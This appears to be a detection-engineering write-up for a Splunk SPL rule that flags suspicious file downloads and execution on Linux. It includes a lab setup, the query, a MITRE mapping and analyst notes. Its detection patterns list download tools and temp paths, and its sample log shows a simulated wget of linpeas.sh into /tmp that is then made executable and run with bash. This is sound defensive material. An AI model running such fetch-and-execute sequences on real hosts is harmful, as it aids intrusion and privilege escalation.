
# Detection Use Case: Suspicious File Downloads & Execution

## Scenario Description
Attackers often download and execute malicious payloads during the initial stages of compromise. These files are commonly fetched using tools like `wget`, `curl`, `ftp`, or `scp`, then executed using commands like `bash`, `chmod +x`, or `./`. These actions frequently occur in temp directories and may involve suspicious file extensions like `.sh`, `.py`, `.elf`, or `.exe`.

## Objective
This detection identifies commands related to suspicious downloads and subsequent execution behaviors, focusing on tools used, paths like `/tmp` or `/dev/shm`, and unusual file extensions that may indicate malware or scripts.

## Tools Used
- **SIEM**: Splunk Enterprise  
- **Log Source**: Linux (`auditd`, `syslog`, `bash_history`)  
- **Lab Setup**:  
  - Kali Linux VM running Splunk Universal Forwarder  
  - Windows host with Splunk Enterprise  
  - Logs forwarded: `audit.log`, `bash_history`  
  - Forwarding via TCP port `9997`  

---

## Data Source Mapping

| Field Name          | Description / Sample Value                      |
|---------------------|--------------------------------------------------|
| `_time`             | `2025-05-24T10:35:15.123+0530`                   |
| `host`              | `kali`                                           |
| `user`              | `root`                                           |
| `cmd`               | `wget`, `curl`, `ftp`, `scp`, `bash`, `chmod`    |
| `arg1`              | First argument to command (e.g., script name)    |
| `arg2`              | Second argument (e.g., execution path)           |
| `suspicious_download` | Tool used for downloading                      |
| `suspicious_exec`   | Command or pattern suggesting execution          |
| `suspicious_path`   | `/tmp`, `/dev/shm`                               |
| `suspicious_ext`    | `.sh`, `.py`, `.elf`, `.exe`                     |
| `index`             | `linux_logs`                                     |
| `sourcetype`        | `auditd` / `bash_history` / `syslog`            |
| `source`            | `/var/log/audit/audit.log`, `/root/.bash_history` |
| `splunk_server`     | `KANHA`                                          |

---

## 🛡️ Detection Logic: Suspicious Downloads Followed by Execution

This SPL (Search Processing Language) query detects suspicious download and execution patterns by correlating download tools, execution attempts, use of temp directories, and uncommon file extensions.

### 🔍 SPL Query Used

```spl
index=linux_logs type=EXECVE
| rex "a0=\"(?<cmd>[^\"]+)\"" 
| rex "a1=\"(?<arg1>[^\"]+)\"" 
| rex "a2=\"(?<arg2>[^\"]+)\""
| eval suspicious_download = if(cmd IN ("wget", "curl", "ftp", "scp"), cmd, null())
| eval suspicious_exec = if(cmd IN ("bash", "chmod"), cmd, if(match(arg1, "^\./.*"), "relative_exec", null()))
| eval suspicious_path = if(match(arg2, "^/tmp/"), "/tmp", if(match(arg2, "^/dev/shm/"), "/dev/shm", null()))
| eval suspicious_ext = if(match(arg1, "\.sh$"), ".sh", if(match(arg1, "\.py$"), ".py", if(match(arg1, "\.elf$"), ".elf", if(match(arg1, "\.exe$"), ".exe", null()))))
| where isnotnull(suspicious_download) OR isnotnull(suspicious_exec) OR isnotnull(suspicious_path) OR isnotnull(suspicious_ext)
| table _time, host, user, cmd, arg1, arg2, suspicious_download, suspicious_exec, suspicious_path, suspicious_ext
```

## Alert

![11](https://github.com/user-attachments/assets/2e4e8d9e-a47b-4d74-86ed-4eae267253d1)


## Log / Sample Event

| _time                      | host | user | cmd   | arg1                                | arg2             | suspicious_download | suspicious_exec | suspicious_path | suspicious_ext |
|---------------------------|------|------|-------|-------------------------------------|------------------|---------------------|-----------------|------------------|----------------|
| 2025-05-24T17:06:05.603+0530 | kali |      | wget  | http://192.168.1.11:8000/linpeas.sh | /tmp/            | wget                |                 | /tmp             | .sh            |
| 2025-05-24T17:04:18.575+0530 | kali |      | chmod | +x                              | /tmp/lin.sh      |                     | chmod           | /tmp             |                |
| 2025-05-24T17:03:34.811+0530 | kali |      | bash  | /tmp/lin.sh                         |                  |                     | bash            |                  | .sh            |
| 2025-05-24T17:02:43.251+0530 | kali |      | chmod | +x                              | /tmp/lin.sh      |                     | chmod           | /tmp         |

![10](https://github.com/user-attachments/assets/0b52fd42-682f-4add-9b9c-e1730a0a87a9)


---

## Detection Status
✅ Working – Tested on Kali Linux with download and execution simulation via `wget` + `bash`

## Analyst Notes / Recommendations

### Suspicious Downloads and Execution
- **Actions:**
  - Investigate source of downloads: URLs, IPs, or scripts.
  - Check integrity and purpose of downloaded files.
  - Correlate with threat intelligence sources (e.g., known malware hashes or domains).
  - Isolate hosts if malware activity is suspected.
- **Possible False Positives:**
  - Legitimate scripts fetched and executed by automation pipelines (CI/CD).
  - Admin activities during software installation.

---

## 🔗 MITRE ATT&CK Mapping

| Technique ID | Name                                    | Tactic                | Platform |
|--------------|-----------------------------------------|------------------------|----------|
| T1105        | Ingress Tool Transfer                   | Command and Control    | Linux    |
| T1059.004    | Command and Scripting Interpreter: Bash | Execution              | Linux    |
| T1070.004    | Indicator Removal on Host: File Deletion| Defense Evasion        | Linux    |

